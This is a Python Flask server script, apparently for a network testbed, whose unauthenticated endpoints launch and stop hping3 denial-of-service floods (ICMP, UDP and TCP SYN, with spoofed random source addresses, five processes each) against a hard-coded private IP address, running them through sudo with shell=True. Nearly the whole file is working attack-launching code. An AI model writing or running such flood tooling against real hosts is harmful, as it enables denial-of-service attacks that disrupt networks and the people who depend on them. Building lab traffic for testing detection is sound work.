from flask import Flask, jsonify
import subprocess
import os
import signal
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TARGET_IP = "192.168.18.20"

active_attacks = {"icmp": [], "udp": [], "tcp": []}

def start_attack_processes(attack_type, command, count=5):
    try:
        if not os.path.exists("/usr/sbin/hping3") and not os.path.exists("/usr/bin/hping3"):
            return {"status": "error", "message": "hping3 not installed"}
        stop_attack_processes(attack_type)  # always clean first!
        pids = []
        for i in range(count):
            process = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                preexec_fn=os.setpgrp)
            pids.append(process.pid)
            logger.info(f"Started {attack_type} attack pid {process.pid}")
        active_attacks[attack_type] = pids
        return {"status": "success", "message": f"{attack_type.upper()} attack started ({count})", "pids": pids}
    except Exception as e:
        logger.error(f"Error starting {attack_type}: {e}")
        return {"status": "error", "message": str(e)}

def stop_attack_processes(attack_type):
    try:
        pids = active_attacks.get(attack_type, [])
        stopped_count = 0
        for pid in pids:
            try:
                os.kill(pid, signal.SIGTERM)
                stopped_count += 1
            except ProcessLookupError:
                pass
            except Exception as e:
                logger.warning(f"Error stopping {attack_type} pid {pid}: {e}")
        active_attacks[attack_type] = []
        return {"status": "success", "message": f"Stopped {stopped_count} {attack_type.upper()} processes"}
    except Exception as e:
        logger.error(f"Error stopping {attack_type}: {e}")
        return {"status": "error", "message": str(e)}

@app.route('/attack/icmp/start')
def start_icmp_attack():
    command = f"sudo hping3 --icmp --flood --rand-source {TARGET_IP}"
    result = start_attack_processes("icmp", command, 5)
    logger.info(f"ICMP start: {result}")
    return jsonify(result), 200 if result["status"]=="success" else 500

@app.route('/attack/udp/start')
def start_udp_attack():
    command = f"sudo hping3 --udp --flood --rand-source --rand-dest {TARGET_IP}"
    result = start_attack_processes("udp", command, 5)
    logger.info(f"UDP start: {result}")
    return jsonify(result), 200 if result["status"]=="success" else 500

@app.route('/attack/tcp/start')
def start_tcp_attack():
    command = f"sudo hping3 -S --flood --rand-source -p 5201 {TARGET_IP}"
    result = start_attack_processes("tcp", command, 5)
    logger.info(f"TCP start: {result}")
    return jsonify(result), 200 if result["status"]=="success" else 500

# NEW: Strong "Kill all" endpoint
@app.route('/attack/killall')
def kill_all_attacks():
    try:
        logger.info("Sending pkill -9 -f hping3 to kill ALL attacks (hard stop)")
        # Force kill all hping3 instances
        subprocess.run(['sudo', 'pkill', '-9', '-f', 'hping3'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Clean up our state
        for k in active_attacks: active_attacks[k] = []
        return jsonify({"status": "success", "message": "All attack processes killed."}), 200
    except Exception as e:
        logger.error(f"Error killing all hping3: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/attack/status')
def get_attack_status():
    # Clean up dead PIDs
    for attack_type in active_attacks:
        active_pids = []
        for pid in active_attacks[attack_type]:
            try:
                os.kill(pid, 0)
                active_pids.append(pid)
            except ProcessLookupError:
                pass
        active_attacks[attack_type] = active_pids
    status = {
        "icmp": {"active": len(active_attacks["icmp"])>0, "count": len(active_attacks["icmp"]), "pids": active_attacks["icmp"]},
        "udp":  {"active": len(active_attacks["udp"]) >0, "count": len(active_attacks["udp"]), "pids": active_attacks["udp"]},
        "tcp":  {"active": len(active_attacks["tcp"]) >0, "count": len(active_attacks["tcp"]), "pids": active_attacks["tcp"]},
    }
    return jsonify(status), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002)
